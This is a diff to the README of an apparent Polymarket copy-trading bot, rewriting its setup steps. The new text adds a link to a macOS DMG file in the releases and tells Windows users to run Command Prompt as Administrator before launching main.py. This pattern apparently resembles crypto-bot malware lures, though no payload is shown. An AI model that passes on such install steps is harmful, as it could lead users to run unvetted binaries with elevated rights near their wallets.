@@ -64,31 +64,55 @@ A sophisticated portfolio mirroring system that enables automated replication of
 - RPC endpoint ([Infura](https://infura.io) or [Alchemy](https://www.alchemy.com))
 
 ### Setup
+The instructions are for Windows and Linux systems; macOS users get the [DMG file](../../releases).  
 
-Clone the repository using Git:
-```bash
-git clone https://github.com/vorvik-61/Copy-Trading-Bot-Polymarket
+
+
+
+
+Check for Git and Python installations on Windows.
+
+Install Git for Windows:
+
+https://git-scm.com/install/windows
+
+Install Python for Windows:
+
+https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe
+
+Open Command Prompt (Administrator).
+
+
+
+
+
+```bash 
+git clone https://github.com/vorvik-61/Copy-Trading-Bot-Polymarket.git
 ```
-
-Install the required dependencies:
-```bash
+```bash 
 cd Copy-Trading-Bot-Polymarket
-pip install -r requirements.txt
 ```
+```bash 
+py -m pip install -r requirements.txt
+```
+```bash 
+py main.py
+```
+
 
 Run the interactive setup wizard:
 ```bash
-python -m src.scripts.setup.setup
+py -m src.scripts.setup.setup
 ```
 
 Verify your configuration:
 ```bash
-python -m src.scripts.setup.system_status
+py -m src.scripts.setup.system_status
 ```
 
 Start the monitoring system:
 ```bash
-python -m src.main
+py -m src.main
 ```
 
 📖 **Detailed instructions available in [Getting Started Guide](docs/GETTING_STARTED.md)**
